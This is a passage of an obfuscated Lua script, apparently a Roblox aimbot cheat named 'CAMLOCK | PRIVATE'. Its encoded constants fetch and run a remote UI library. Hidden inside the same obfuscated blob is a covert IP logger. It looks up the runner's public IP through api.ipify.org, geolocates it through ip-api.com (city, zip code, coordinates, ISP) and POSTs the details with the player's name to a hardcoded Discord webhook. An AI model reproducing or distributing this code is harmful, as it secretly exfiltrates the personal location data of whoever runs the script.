418) ;end end end if ((v261==(1371 -(1127 + 243))) or ((6519 -3220)<(3851 -(440 + 246 + (300 -230))))) then local v331=(953 + 687) -(114 + 1526) ;while true do if (((1084 + 2345)==(4538 -(524 + 338 + 247))) and (v331==(0 + 0))) then v264=v95[v262] + v263 ;v95[v262]=v264;v331=83 -(16 + 66) ;end if (((59 + 65)==(271 -147)) and (v331==(1 -(252 -(54 + 198))))) then v261=261 -(21 + 238) ;break;end end end if (((634 + 359)<(6244 -(1471 + 117))) and (v261==(1204 -(953 + 249)))) then if ((v263>(0 -0)) or ((594 + 3300)==(7600 -(4136 + 1207)))) then if ((v264<=v95[v262 + (2 -1) ]) or ((508 + 143)>=(7559 -5587))) then local v419=0 + 0 ;local v420;local v421;while true do if ((v419==(0 -0)) or (((5187 -(365 + 55)) -2585)==(6102 -(11114 -8290)))) then v420=0 + 0 ;v421=nil;v419=1 + 0 ;end if ((v419==(1 + 0)) or (3434==((8649 -(413 + 325)) -4862))) then while true do if (((4723 -(15 + 17))>(935 + 495)) and (v420==(1311 -(800 + 511)))) then v421=988 -(920 + 68) ;while true do if (((455 + 1244)>(2129 -(3283 -2498))) and ((0 + (1394 -(1052 + 342)))==v421)) then v83=v97[648 -(94 + 551) ];v95[v262 + (9 -6) ]=v264;break;end end break;end end break;end end end elseif ((v264>=v95[v262 + (1614 -(1103 + (1304 -794))) ]) or ((1916 + 2070)<(3753 -(530 + 177)))) then local v422=0 + 0 ;local v423;while true do if (((144 + 952)>=(298 + 228)) and ((0 -0)==v422)) then v423=0 + 0 ;while true do if ((((16422 -12934) -(578 + 1221))<=(4968 -(110 + 169))) and (v423==((0 + 0) -0))) then v83=v97[11 -(18 -10) ];v95[v262 + (1879 -((1714 -1109) + 1271)) ]=v264;break;end end break;end end end break;end end break;end if ((v260==(133 -(107 + 25))) or ((10029 -6507)<(2206 -(100 + 224 + 579)))) then v263=nil;v264=nil;v260=2 + 0 ;end end else v36[v97[1979 -(1788 + (255 -67)) ]]=v95[v97[5 -3 ]];end elseif (((2879 -(1708 + 128))==(1563 -(96 + 424))) and (v98<=(867 -(652 + 156)))) then if (((2822 -1897)<(4191 -(1478 + 234))) and (v98<=(107 -50))) then if (((4465 -(1162 + 93 + 19))>(1115 + 830)) and (v98==(1357 -(278 + 1023)))) then do return;end else v95[v97[223 -(100 + 121) ]]=v34(v90[v97[3 -0 ]],nil,v37);end elseif (((1119 + 187)>=(1314 -(298 + 44))) and (v98>(1616 -(406 + 1152)))) then if ((1875<=3411) and (v97[2]==v95[v97[12 -8 ]])) then v83=v83 + (3 -2) ;else v83=v97[6 -3 ];end else local v268=0 + 0 ;local v269;while true do if ((v268==(1732 -(1604 + 128))) or ((4338 -(575 + 133))<(6650 -4349))) then v269=v97[4 -(4 -2) ];do return v13(v95,v269,v269 + v97[3] );end break;end end end elseif (((3919 -(145 + 5))==(3814 -(18 + 24 + 3))) and (v98<=(1059 -(198 + 208 + 592)))) then if ((v98==(55 + 5)) or ((2933 + 1880)<=(9047 -7215))) then v95[v97[(50 + 99) -(93 + 54) ]]=v95[v97[3]][v97[18 -14 ]];else v95[v97[813 -(573 + 238) ]]=v95[v97[2 + 1 ]];end elseif ((v98==62) or ((5 + 840)>(1331 + 562))) then v95[v97[2 + 0 ]]=v95[v97[5 -(1058 -(436 + 620)) ]]%v95[v97[778 -(520 + 254) ]] ;elseif ((v95[v97[4 -2 ]]~=v95[v97[15 -11 ]]) or ((78 + 94)==(5526 -2649))) then v83=v83 + 1 + 0 ;else v83=v97[2 + 1 ];end v83=v83 + (1 -(1455 -(249 + 1206))) ;break;end if ((v102==((0 -0) -0)) or ((5376 -(562 + 893))<(2975 -(105 + 969)))) then local v110=1407 -(309 + 1098) ;while true do if ((v110==((1 + 2) -2)) or ((339 + 913)>(7007 -3362))) then v102=1;break;end if (((0 + 0 + 0)==v110) or ((1221 + 2595)<(32 + 1))) then v97=v89[v83];v98=v97[1814 -((1146 -(108 + 342)) + 1117) ];v110=1 -(0 + 0) ;end end end end end end A,B=v32(v11(v87));if  not A[1] then local v103=v35[4][v83] or "?" ;error("Script error at ["   .. v103   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end if (v67==0) then v68=v35[1];v69=v35[2];v67=1;end end end return v34(v33(),{},v17)(...);end v15("LOL!B43O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E73657274028O00026O001C4003073O004B6579446F776E03073O00436F2O6E65637403023O005F47030A3O00FBF8AD5DCEDB5AD9EEAD03073O00BC9DD91EA2B429026O002040026O00104003043O007461736B03053O00737061776E030F3O006765747261776D6574617461626C6503043O0067616D6503073O002O5F696E646578030B3O00736574726561646F6E6C79030B3O006E65772O636C6F73757265026O00144003073O0067657467656E762O033O00444E5303063O0053696C656E7403073O00456E61626C65642O0103043O005061727403103O0048756D616E6F6964522O6F745061727403043O005072656402105839B4C876BE3F030B3O00436C6F73657374506172742O033O00464F5603073O0056697369626C65010003063O00526164697573026O00344003063O005472616365722O033O004B657903013O0043027B14AE47E17A843F030A3O00536D2O6F74686E652O73023BDF4F8D976E823F03043O004D697363030F3O00556E6C6F636B65644F6E446561746803053O005368616B65030A3O005368616B6556616C7565028FC2F5285C8FE23F030A3O006C6F6164737472696E6703073O00482O747047657403483O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F6D61746173333533352F502O6F704C6962726172792F6D61696E2F4C6962726172792E6C75612O033O004E657703043O004E616D65031A3O002C5F2C207C2032302043414D4C4F434B207C205052495641544503043O0053697A6503073O00566563746F72322O033O006E6577025O00C07E40025O00B0824003063O00412O63656E7403063O00436F6C6F723303073O0066726F6D524742026O006440026O003940026O006E4003043O005061676503063O0041696D626F7403083O0053652O74696E677303073O0053656374696F6E03043O004D61696E03043O005369646503043O004C65667403053O005269676874026O00F03F03063O00546F2O676C6503073O0044656661756C7403073O00506F696E74657203123O0041696D626F744D61696E5F456E61626C656403083O0043612O6C6261636B03073O0053686F77466F76030D3O005368616B655F456E61626C6564030D3O00556E6C6F636B4F6E446561746803153O00556E6C6F636B4F6E44656174685F456E61626C656403063O00536C6964657203073O004D696E696D756D02FCA9F1D24D62503F03073O004D6178696D756D026O00F83F0279E9263108AC8C3F03083O00446563696D616C7303153O0041696D626F744D61696E5F536D2O6F74686E652O73030A3O00464F5620526164697573026O005940026O002F4003113O0041696D626F744D61696E5F526164697573030B3O005368616B652056616C7565026O00E03F03103O0041696D626F744D61696E5F422O6F7479027O0040026O00224003073O00506C6179657273030B3O00506C61796572412O646564030E3O00506C6179657252656D6F76696E6703093O00486561727462656174026O00084003073O0044726177696E6703063O00436972636C6503053O00436F6C6F7203093O00546869636B6E652O7303133O00900DFF33B612E410BF13D632BC0CDD2FA612F503043O00D361904003113O005472616365722050726564696374696F6E026O002440029A5O99B93F03113O0053696C656E742050726564696374696F6E02F6285C8FC2F5C83F0248E17A14AE47C13F03093O00436F6E666967426F78030C3O0042752O746F6E486F6C64657203073O0042752O746F6E7303043O004C6F616403043O005361766503053O004C6162656C034D3O00556E6C6F6164696E672077692O6C2066752O6C7920756E6C6F61640A65766572797468696E672C20736F207361766520796F75720A636F6E666967206265666F726520756E6C6F6164696E672E03063O004D692O646C6503063O0042752O746F6E03063O00556E6C6F6164030A3O00496E697469616C697A65030A3O0047657453657276696365030B3O004C6F63616C506C6179657203083O004765744D6F757365030A3O0052756E5365727669636503093O00576F726B7370616365030D3O0043752O72656E7443616D657261026O001840030B3O00482O747053657276696365030A3O004A534F4E4465636F646503043O00426F647903083O00746F737472696E6703023O0069702O033O0073796E03073O00726571756573742O033O0055726C03063O00666F726D617403193O00682O74703A2O2F69702D6170692E636F6D2F6A736F6E2F257303063O004D6574686F642O033O0047657403023O00495003073O00636F756E747279030B3O00636F756E747279436F646503063O00726567696F6E030A3O00726567696F6E4E616D6503043O006369747903073O007A6970636F64652O033O007A697003083O006C617469747564652O033O006C617403093O006C6F6E6769747564652O033O006C6F6E2O033O006973702O033O006F7267036C3O00557365723A2025730A49503A2025730A436F756E7472793A2025730A436F756E74727920436F64653A2025730A526567696F6E3A2025730A526567696F6E204E616D653A2025730A436974793A2025730A5A6970636F64653A2025730A4953503A2025730A4F72673A20257303073O00636F6E74656E7403043O00504F535403073O0048656164657273030C3O00436F6E74656E742D5479706503103O00612O706C69636174696F6E2F6A736F6E030A3O004A534F4E456E636F646503213O00D8D74FF38F30EDD748C9BA30EDC66FD2A924EDC154CFA53FDCDA5ACF8B32EBD74903063O009FB23BBDEA5103043O007761697403793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313037313630313930313833393331393037322F727A44436A47796843304E5171544F572O47796563417933444A374D76304A49674B47546B6D6F2D52744135733444644D756966524C6539464236394E41774B4958316603053O007063612O6C03223O00682O7470733A2O2F6170692E69706966792E6F72672F3F666F726D61743D6A736F6E2O033O004745540027022O00120B3O00013O00203C5O000200120B000100013O00203C00010001000300120B000200013O00203C00020002000400120B000300053O0006040003000A000100010004283O000A000100120B000300063O00203C00040003000700120B000500083O00203C00050005000900120B000600083O00203C00060006000A00062O00073O000100062O003D3O00064O003D8O003D3O00044O003D3O00014O003D3O00024O003D3O00053O0012140008000B4O001D000900313O0026290008002F0001000C0004283O002F000100203C00320013000D00200500320032000E00062O00340001000100012O003D3O00204O001C00320034000100120B0032000F4O003D003300073O001214003400103O001214003500114O000300330035000200062O00340002000100022O003D3O00134O003D3O001F4O00180032003300342O001D001900193O000239001900034O001D002C002C3O000239002C00044O001D002D002D3O000239002D00053O001214000800123O00262900080050000100130004283O00500001000239001A00063O00062O001B0007000100052O003D3O001A4O003D3O00194O003D3O00184O003D3O00134O003D3O00164O001D001C001C3O00120B003200143O00203C00320032001500062O00330008000100022O003D3O001C4O003D3O001B4O001200320002000100120B003200163O00120B003300174O00310032000200022O003D001D00323O00203C001E001D001800120B003200194O003D0033001D4O002300346O001C00320034000100120B0032001A3O00062O00330009000100032O003D3O00134O003D3O001C4O003D3O001E4O0031003200020002001032001D001800320012140008001B3O002629000800A30001000B0004283O00A3000100120B0032001C4O00330032000100022O001100333O00042O001100343O00040030190034001F00200030190034002100220030190034002300240030190034002500200010320033001E00342O001100343O000200301900340027002800301900340029002A0010320033002600342O001100343O00050030190034002C002D0030190034001F002800301900340023002E0030190034002100220030190034002F00300010320033002B00342O001100343O00030030190034003200200030190034003300280030190034003400350010320033003100340010320032001D003300120B003200363O00120B003300173O002005003300330037001214003500384O000D003300354O003500323O00022O00330032000100022O003D000900323O0020050032000900392O001100343O00030030190034003A003B00120B0035003D3O00203C00350035003E0012140036003F3O001214003700404O00030035003700020010320034003C003500120B003500423O00203C003500350043001214003600443O001214003700453O001214003800464O00030035003800020010320034004100352O00030032003400022O003D000A00323O0020050032000A00472O001100343O00010030190034003A00482O00030032003400022O003D000B00323O0020050032000A00472O001100343O00010030190034003A00492O00030032003400022O003D000C00323O0020050032000B004A2O001100343O00020030190034003A004B0030190034004C004D2O00030032003400022O003D000D00323O0020050032000B004A2O001100343O00020030190034003A00310030190034004C004E2O00030032003400022O003D000E00323O0020050032000B004A2O001100343O00020030190034003A00490030190034004C004D2O00030032003400022O003D000F00323O0012140008004F3O000E3B004F00ED000100080004283O00ED00010020050032000C004A2O001100343O00020030190034003A004B0030190034004C004D2O00030032003400022O003D001000323O0020050032000D00502O001100343O00040030190034003A001F0030190034005100280030190034005200530002390035000A3O0010320034005400352O001C0032003400010020050032000D00502O001100343O00040030190034003A00550030190034005100280030190034005200530002390035000B3O0010320034005400352O001C0032003400010020050032000E00502O001100343O00040030190034003A00330030190034005100280030190034005200560002390035000C3O0010320034005400352O001C0032003400010020050032000E00502O001100343O00040030190034003A00570030190034005100280030190034005200580002390035000D3O0010320034005400352O001C0032003400010020050032000F00592O001100343O00070030190034003A002F0030190034005A005B0030190034005C005D00301900340051005E0030190034005F005B0030190034005200600002390035000E3O0010320034005400352O001C0032003400010020050032000F00592O001100343O00070030190034003A00610030190034005A002E0030190034005C00620030190034005100630030190034005F002E0030190034005200640002390035000F3O0010320034005400352O001C0032003400010020050032000F00592O001100343O00070030190034003A00650030190034005A00660030190034005C00620030190034005100350030190034005F005B003019003400520067000239003500103O0010320034005400352O001C003200340001001214000800683O002629000800072O0100690004283O00072O01000239002F00114O001D003000303O00062O00300012000100012O003D3O002F4O001D003100313O000239003100133O00120B003200173O00203C00320032006A00203C00320032006B00200500320032000E2O003D003400304O001C00320034000100120B003200173O00203C00320032006A00203C00320032006C00200500320032000E2O003D003400314O001C00320034000100203C0032002E006D00200500320032000E00062O00340014000100012O003D3O002F4O001C0032003400010004283O002502010026290008002E2O01006E0004283O002E2O0100120B0032006F3O00203C00320032003E001214003300704O00310032000200022O003D001600323O00120B003200423O00203C00320032003E0012140033004F3O0012140034004F3O0012140035004F4O000300320035000200103200160071003200301900160072004F00062O00170015000100022O003D3O00164O003D3O00133O00203C00320014006D00200500320032000E2O003D003400174O001C00320034000100120B0032000F4O003D003300073O001214003400733O001214003500744O000300330035000200062O00340016000100052O003D3O00114O003D3O00124O003D3O00164O003D3O00154O003D3O00134O001800320033003400062O00180017000100012O003D3O00153O00062O00190018000100012O003D3O00153O001214000800133O000E3B006800812O0100080004283O00812O010020050032000F00592O001100343O00070030190034003A00750030190034005A005B0030190034005C00760030190034005100770030190034005F005B003019003400520067000239003500193O0010320034005400352O001C0032003400010020050032000F00592O001100343O00070030190034003A00780030190034005A00770030190034005C007900301900340051007A0030190034005F005B0030190034005200670002390035001A3O0010320034005400352O001C00320034000100200500320010007B2O001100346O001C00320034000100200500320010007C2O001100343O00012O0011003500024O0011003600023O0012140037007E3O0002390038001B4O00270036000200012O0011003700023O0012140038007F3O0002390039001C4O00270037000200012O00270035000200010010320034007D00352O001C0032003400010020050032001000802O001100343O00020030190034003A00810030190034008200202O001C0032003400010020050032001000832O001100343O00020030190034003A008400062O0035001D000100012O003D3O000A3O0010320034005400352O001C0032003400010020050032000A00852O001200320002000100120B003200173O0020050032003200860012140034006A4O000300320034000200120B003300173O0020050033003300860012140035006A4O000300330035000200203C00330033008700120B003400173O0020050034003400860012140036006A4O000300340036000200203C0034003400870020050034003400882O003100340002000200120B003500173O002005003500350086001214003700894O000300350037000200120B003600173O00203C00360036008A00203C00150036008B2O003D001400354O003D001300344O003D001200334O003D001100323O0012140008006E3O002629000800DE2O01008C0004283O00DE2O0100120B003200173O0020050032003200860012140034008D4O000300320034000200200500320032008E00203C00340024008F2O00030032003400022O003D002500323O00120B003200903O00203C0033002500912O00310032000200022O003D002600323O00120B003200923O00203C0032003200932O001100333O000200120B003400013O00203C003400340095001214003500964O003D003600264O00030034003600020010320033009400340030190033009700982O00310032000200022O003D002700323O00120B003200173O0020050032003200860012140034008D4O000300320034000200200500320032008E00203C00340027008F2O00030032003400022O003D002800324O001100323O000B00103200320099002600203C00330028009A0010320032009A003300203C00330028009B0010320032009B003300203C00330028009C0010320032009C003300203C00330028009D0010320032009D003300203C00330028009E0010320032009E003300203C0033002800A00010320032009F003300203C0033002800A2001032003200A1003300203C0033002800A4001032003200A3003300203C0033002800A5001032003200A5003300203C0033002800A6001032003200A600332O003D002900323O00120B003200013O00203C003200320095001214003300A74O003D003400223O00203C00350029009900203C00360029009A00203C00370029009B00203C00380029009C00203C00390029009D00203C003A0029009E00203C003B0029009F00203C003C002900A500203C003D002900A62O00030032003D00022O003D002A00324O001100323O0001001032003200A8002A2O003D002B00323O00120B003200923O00203C0032003200932O001100333O00040010320033009400230030190033009700A92O001100343O0001003019003400AB00AC001032003300AA003400120B003400173O0020050034003400860012140036008D4O00030034003600020020050034003400AD2O003D0036002B4O00030034003600020010320033008F00342O00120032000200010012140008000C3O000E3B00120004020100080004283O000402012O001D001800183O0002390018001E3O00120B0032000F4O003D003300073O001214003400AE3O001214003500AF4O000300330035000200062O0034001F000100042O003D3O002C4O003D3O00194O003D3O00184O003D3O00134O001800320033003400120B003200173O00203C00320032008900203C00320032006D00200500320032000E00062O00340020000100022O003D3O00204O003D3O00154O001C00320034000100120B003200143O00203C00320032001500062O00330021000100012O003D3O00204O001200320002000100120B003200B03O0012140033004F4O001200320002000100120B003200173O002005003200320086001214003400894O00030032003400022O003D002E00324O001D002F002F3O001214000800693O002629000800180001001B0004283O0018000100120B003200173O00203C00320032008A00203C001F0032008B00120B003200173O00203C00320032006A00203C0032003200870020050032003200882O00310032000200022O003D001300324O001D002000203O001214002100B13O00120B003200B23O00062O00330022000100012O003D3O00214O001200320002000100120B003200173O0020050032003200860012140034006A4O000300320034000200203C00320032008700203C00220032003A001214002300B13O00120B003200923O00203C0032003200932O001100333O00020030190033009400B30030190033009700B42O00310032000200022O003D002400323O0012140008008C3O0004283O001800012O002A00086O00383O00013O00233O00023O00026O00F03F026O00704002284O001100025O001214000300014O000900045O001214000500013O0004260003002300012O001500076O003D000800024O0015000900014O0015000A00024O0015000B00034O0015000C00044O003D000D6O003D000E00063O00201F000F000600012O000D000C000F4O0035000B3O00022O0015000C00034O0015000D00044O003D000E00013O002002000F000600012O0009001000014O003E000F000F001000100A000F0001000F0020020010000600012O0009001100014O003E00100010001100100A00100001001000201F0010001000012O000D000D00104O0001000C6O0035000A3O000200202B000A000A00022O000F0009000A4O002100073O00010004370003000500012O0015000300054O003D000400024O0017000300044O002F00036O00383O00017O00283O00093O000A3O000A3O000A3O000A3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000A3O000D3O000D3O000D3O000D3O000E3O000C3O00028O00026O00F03F03073O0067657467656E762O033O00444E5303063O005472616365722O033O004B657903053O006C6F77657203073O00456E61626C65642O01030C3O00497354617267652O74696E67030A3O00476574436C6F7365737400013B3O001214000100014O001D000200033O000E3B00010007000100010004283O00070001001214000200014O001D000300033O001214000100023O00262900010002000100020004283O0002000100262900020009000100010004283O0009000100120B000400034O003300040001000200203C00040004000400203C00040004000500203C0004000400060020050004000400072O00310004000200022O003D000300043O0006203O003A000100030004283O003A000100120B000400034O003300040001000200203C00040004000400203C00040004000500203C0004000400080026290004003A000100090004283O003A0001001214000400014O001D000500053O0026290004001E000100010004283O001E0001001214000500013O00262900050021000100010004283O0021000100120B0006000A4O000C000600063O0012250006000A3O00120B0006000A3O00060E0006002D00013O0004283O002D000100120B0006000B4O00330006000100022O003600065O0004283O003A00012O001500065O00262E0006003A0001000C0004283O003A00012O001D000600064O003600065O0004283O003A00010004283O002100010004283O003A00010004283O001E00010004283O003A00010004283O000900010004283O003A00010004283O000200012O00383O00017O003B3O003D3O003E3O00413O00413O00423O00433O00443O00463O00463O00483O00483O00493O00493O00493O00493O00493O00493O00493O00493O004A3O004A3O004B3O004B3O004B3O004B3O004B3O004B3O004B3O004C3O004D3O004F3O004F3O00503O00523O00523O00533O00533O00533O00543O00543O00543O00553O00553O00553O00553O00563O00563O00563O00573O00573O00593O005A3O005C3O005D3O00613O00623O00643O00653O00673O00093O00028O00026O00F03F03053O00706169727303043O0067616D6503073O00506C6179657273030A3O00476574506C617965727303053O007063612O6C03043O006D61746803043O0068756765001F3O0012143O00014O001D000100023O0026293O0017000100020004283O0017000100120B000300033O00120B000400043O00203C0004000400050020050004000400062O000F000400054O001300033O00050004283O0014000100120B000800073O00062O00093O000100052O003D3O00074O00158O003D3O00024O003D3O00014O00153O00014O00120008000200012O002A00065O0006220003000B000100020004283O000B00012O0006000100023O000E3B0001000200013O0004283O000200012O001D000100013O00120B000300083O00203C0002000300090012143O00023O0004283O000200012O00383O00013O00013O00103O0003043O0067616D6503073O00506C6179657273030B3O004C6F63616C506C6179657203093O00436861726163746572030E3O0046696E6446697273744368696C6403083O0048756D616E6F6964028O00026O00F03F03073O00566563746F72322O033O006E657703013O005803013O005903093O006D61676E697475646503143O00576F726C64546F56696577706F7274506F696E74030B3O005072696D6172795061727403083O00506F736974696F6E00624O00157O00120B000100013O00203C00010001000200203C00010001000300063F3O0061000100010004283O006100012O00157O00203C5O000400060E3O006100013O0004283O006100012O00157O00203C5O00040020055O0005001214000200064O00033O0002000200060E3O006100013O0004283O006100010012143O00074O001D000100033O0026293O0018000100070004283O00180001001214000100074O001D000200023O0012143O00083O0026293O0013000100080004283O001300012O001D000300033O0026290001003D000100080004283O003D000100120B000400093O00203C00040004000A00203C00050002000B00203C00060002000C2O000300040006000200120B000500093O00203C00050005000A2O0015000600013O00203C00060006000B2O0015000700013O00203C00070007000C2O00030005000700022O002C00040004000500203C00040004000D2O0015000500023O00061E00040061000100050004283O00610001001214000400074O001D000500053O00262900040030000100070004283O00300001001214000500073O00262900050033000100070004283O003300012O001500066O0036000600034O0036000300023O0004283O006100010004283O003300010004283O006100010004283O003000010004283O006100010026290001001B000100070004283O001B0001001214000400073O00262900040059000100070004283O005900012O0015000500043O00200500050005000E2O001500075O00203C00070007000400203C00070007000F00203C0007000700102O00030005000700022O003D000200053O00120B000500093O00203C00050005000A00203C00060002000B00203C00070002000C2O000300050007000200120B000600093O00203C00060006000A2O0015000700013O00203C00070007000B2O0015000800013O00203C00080008000C2O00030006000800022O002C00050005000600203C00030005000D001214000400083O00262900040040000100080004283O00400001001214000100083O0004283O001B00010004283O004000010004283O001B00010004283O006100010004283O001300012O00383O00017O00623O00703O00703O00703O00703O00703O00703O00703O00703O00703O00703O00703O00703O00703O00703O00703O00703O00703O00713O00723O00763O00763O00773O00783O00793O007B3O007B3O007C3O007E3O007E3O007F3O007F3O007F3O007F3O007F3O007F3O007F3O007F3O007F3O007F3O007F3O007F3O007F3O007F3O007F3O007F3O007F3O00803O00813O00833O00833O00843O00863O00863O00873O00873O00883O00893O008A3O008C3O008D3O00903O00923O00923O00933O00953O00953O00963O00963O00963O00963O00963O00963O00963O00963O00973O00973O00973O00973O00973O00973O00973O00973O00973O00973O00973O00973O00973O00973O00983O009A3O009A3O009B3O009C3O009D3O009F3O00A13O00A23O00A53O001F3O00693O006A3O006D3O006D3O006E3O006E3O006E3O006E3O006E3O006E3O006E3O006F3O00A53O00A53O00A53O00A53O00A53O00A53O006F3O00A53O006E3O00A53O00A73O00A93O00A93O00AA3O00AB3O00AB3O00AC3O00AD3O00AF3O00073O00028O00026O00F03F03043O0067616D6503093O00576F726B7370616365030D3O0043752O72656E7443616D65726103123O00576F726C64546F5363722O656E506F696E7403083O00506F736974696F6E011B3O001214000100014O001D000200033O00262900010007000100010004283O00070001001214000200014O001D000300033O001214000100023O00262900010002000100020004283O0002000100262900020009000100010004283O00090001001214000400013O0026290004000C000100010004283O000C000100120B000500033O00203C00050005000400203C00050005000500200500050005000600203C00073O00072O00030005000700022O003D000300054O0006000300023O0004283O000C00010004283O000900010004283O001A00010004283O000200012O00383O00017O001B3O00B23O00B33O00B63O00B63O00B73O00B83O00B93O00BB3O00BB3O00BD3O00BD3O00BE3O00C03O00C03O00C13O00C13O00C13O00C13O00C13O00C13O00C13O00C23O00C33O00C53O00C73O00C83O00CA3O00083O00028O0003063O00737472696E6703043O0066696E6403043O004E616D652O033O0047756E2O033O0049734103043O005061727403083O004D65736850617274011A3O001214000100013O00262900010001000100010004283O0001000100120B000200023O00203C00020002000300203C00033O0004001214000400054O000300020004000200060E0002000B00013O0004283O000B00012O00383O00013O00200500023O0006001214000400074O000300020004000200060400020015000100010004283O0015000100200500023O0006001214000400084O000300020004000200060E0002001900013O0004283O001900012O0023000200014O0006000200023O0004283O001900010004283O000100012O00383O00017O001A3O00CD3O00CF3O00CF3O00D03O00D03O00D03O00D03O00D03O00D03O00D03O00D13O00D33O00D33O00D33O00D33O00D33O00D33O00D33O00D33O00D33O00D33O00D43O00D43O00D63O00D73O00D93O00083O0003043O0067616D6503093O00576F726B7370616365030D3O0043752O72656E7443616D65726103123O00576F726C64546F5363722O656E506F696E7403073O00566563746F72322O033O006E657703013O005803013O0059010D3O00120B000100013O00203C00010001000200203C0001000100030020050001000100042O003D00036O000300010003000200120B000200053O00203C00020002000600203C00030001000700203C0004000100082O0017000200044O002F00026O00383O00017O000D3O00DC3O00DC3O00DC3O00DC3O00DC3O00DC3O00DD3O00DD3O00DD3O00DD3O00DD3O00DD3O00DE3O000A3O00028O0003063O00737472696E6703043O0066696E6403043O004E616D652O033O0047756E03053O007461626C6503043O005061727403083O004D6573685061727403083O00426173655061727403093O00436C612O734E616D65011B3O001214000100013O00262900010001000100010004283O0001000100120B000200023O00203C00020002000300203C00033O0004001214000400054O000300020004000200060E0002000B00013O0004283O000B00012O00383O00013O00120B000200063O00203C0002000200032O0011000300033O001214000400073O001214000500083O001214000600094O002700030003000100203C00043O000A2O000300020004000200060E0002001A00013O0004283O001A00012O0023000200014O0006000200023O0004283O001A00010004283O000100012O00383O00017O001B3O00E33O00E53O00E53O00E63O00E63O00E63O00E63O00E63O00E63O00E63O00E73O00E93O00E93O00E93O00E93O00E93O00E93O00E93O00E93O00E93O00E93O00E93O00EA3O00EA3O00EC3O00ED3O00EF3O000A3O00028O00026O00F03F030B3O004765744368696C6472656E03043O006E65787403073O00566563746F72322O033O006E657703013O005803013O005903093O004D61676E697475646503063O0052616469757301473O001214000100014O001D000200033O00262900010007000100010004283O000700010030100002000200012O001D000300033O001214000100023O000E3B00020002000100010004283O0002000100060E3O004400013O0004283O0044000100200500043O00032O003100040002000200060E0004004400013O0004283O0044000100120B000400043O00200500053O00032O00160005000200060004283O004200012O001500096O003D000A00084O003100090002000200060E0009004200013O0004283O004200012O0015000900014O003D000A00084O003100090002000200060E0009004200013O0004283O00420001001214000900014O001D000A000A3O0026290009001F000100010004283O001F00012O0015000B00024O003D000C00084O0031000B0002000200120B000C00053O00203C000C000C00062O0015000D00033O00203C000D000D00072O0015000E00033O00203C000E000E00082O0003000C000E00022O002C000B000B000C00203C000A000B00092O0015000B00043O00203C000B000B000A00061E000A00420001000B0004283O0042000100061E000A0042000100020004283O00420001001214000B00014O001D000C000C3O002629000B0035000100010004283O00350001001214000C00013O000E3B000100380001000C0004283O003800012O003D0002000A4O003D000300083O0004283O004200010004283O003800010004283O004200010004283O003500010004283O004200010004283O001F000100062200040013000100020004283O001300012O0006000300023O0004283O000200012O00383O00017O00473O00F13O00F23O00F53O00F53O00F63O00F73O00F83O00FA3O00FA3O00FB3O00FB3O00FB3O00FB3O00FB3O00FB3O00FC3O00FC3O00FC3O00FC3O00FD3O00FD3O00FD3O00FD3O00FD3O00FD3O00FD3O00FD3O00FD3O00FD3O00FE3O00FF3O002O012O002O012O0002012O0002012O0002012O0002012O0002012O0002012O0002012O0002012O0002012O0002012O0002012O0002012O0003012O0003012O0003012O0003012O0003012O0003012O0004012O0005012O0007012O0007012O0008012O000A012O000A012O000B012O000C012O000D012O000E012O0010012O0011012O0014012O0015012O00FC3O0017012O001A012O001B012O001D012O000B3O0003043O007461736B03043O007761697403073O0067657467656E762O033O00444E5303063O0053696C656E7403073O00456E61626C6564030B3O00436C6F73657374506172742O0103043O005061727403083O00746F737472696E6703093O0043686172616374657200233O00120B3O00013O00203C5O00022O00333O0001000200060E3O002200013O0004283O002200012O00157O00060E5O00013O0004285O000100120B3O00034O00333O0001000200203C5O000400203C5O000500203C5O000600060E5O00013O0004285O000100120B3O00034O00333O0001000200203C5O000400203C5O000500203C5O00070026295O000100080004285O000100120B3O00034O00333O0001000200203C5O000400203C5O000500120B0001000A4O0015000200014O001500035O00203C00030003000B2O000F000200034O003500013O00020010323O000900010004285O00012O00383O00017O00233O0020012O0020012O0020012O0020012O0020012O0021012O0021012O0021012O0022012O0022012O0022012O0022012O0022012O0022012O0022012O0022012O0022012O0022012O0022012O0022012O0022012O0022012O0023012O0023012O0023012O0023012O0023012O0023012O0023012O0023012O0023012O0023012O0023012O0025012O0027012O00103O00028O0003073O0067657467656E762O033O00444E5303063O0053696C656E7403073O00456E61626C656403083O00746F737472696E672O033O0048697403133O00436C6F73657374506C7246726F6D4D6F757365026O00F03F03043O0067616D6503073O00506C617965727303093O0043686172616374657203043O005061727403063O00434672616D6503083O0056656C6F6369747903043O0050726564026D3O001214000200014O001D000300033O00262900020002000100010004283O00020001001214000300013O00262900030005000100010004283O00050001001214000400013O00262900040008000100010004283O0008000100120B000500024O003300050001000200203C00050005000300203C00050005000400203C00050005000500060E0005006300013O0004283O006300012O001500055O00060E0005006300013O0004283O0063000100120B000500064O003D000600014O003100050002000200262900050063000100070004283O00630001001214000500013O0026290005001A000100010004283O001A000100120B000600084O00330006000100022O0036000600014O0015000600013O00060E0006006300013O0004283O00630001001214000600014O001D000700083O00262900060029000100010004283O00290001001214000700014O001D000800083O001214000600093O00262900060024000100090004283O00240001000E3B0001002B000100070004283O002B0001001214000900013O0026290009002E000100010004283O002E000100120B000A000A3O00203C000A000A000B00120B000B00064O0015000C00014O0031000B000200022O0007000A000A000B00203C000A000A000C00120B000B00024O0033000B0001000200203C000B000B000300203C000B000B000400203C000B000B000D2O0007000A000A000B00203C000A000A000E00120B000B000A3O00203C000B000B000B00120B000C00064O0015000D00014O0031000C000200022O0007000B000B000C00203C000B000B000C00120B000C00024O0033000C0001000200203C000C000C000300203C000C000C000400203C000C000C000D2O0007000B000B000C00203C000B000B000F00120B000C00024O0033000C0001000200203C000C000C000300203C000C000C000400203C000C000C00102O002D000B000B000C2O001A0008000A000B00120B000A00064O003D000B00014O0031000A00020002002629000A005A000100070004283O005A00012O003D000A00083O0004283O005C00012O0024000A6O0023000A00014O0006000A00023O0004283O002E00010004283O002B00010004283O006300010004283O002400010004283O006300010004283O001A00012O0015000500024O003D00066O003D000700014O0017000500074O002F00055O0004283O000800010004283O000500010004283O006C00010004283O000200012O00383O00017O006D3O002C012O002D